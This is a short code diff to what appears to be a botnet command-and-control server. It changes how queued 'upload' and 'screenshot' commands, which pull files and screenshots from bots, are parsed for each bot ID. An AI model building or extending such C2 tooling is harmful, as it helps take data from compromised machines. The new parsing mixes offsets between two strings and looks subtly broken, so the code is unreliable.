@@ -196,8 +196,17 @@ class API(object):
         if not validate_botid(botid):
             raise cherrypy.HTTPError(403)
         exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), cmd, False, html_escape(botid)))
-        if cmd.startswith("upload "):
-            pending_uploads.append(os.path.basename(cmd.split("upload ")[1]))
+        if "upload" in cmd:
+            uploads = cmd[cmd.find("upload"):]
+            up_cmds = [i for i in uploads.split("upload ") if i]
+            for upload in up_cmds:
+                end_pos = upload.find(";")
+                while end_pos > 0 and cmd[end_pos - 1] == '\\':
+                    end_pos = cmd.find(";", end_pos + 1)
+                upload_filename = upload
+                if end_pos != -1:
+                    upload_filename = upload_filename[:end_pos]
+                pending_uploads.append(os.path.basename(upload_filename))
         if cmd.startswith("screenshot"):
             pending_uploads.append("screenshot")
 
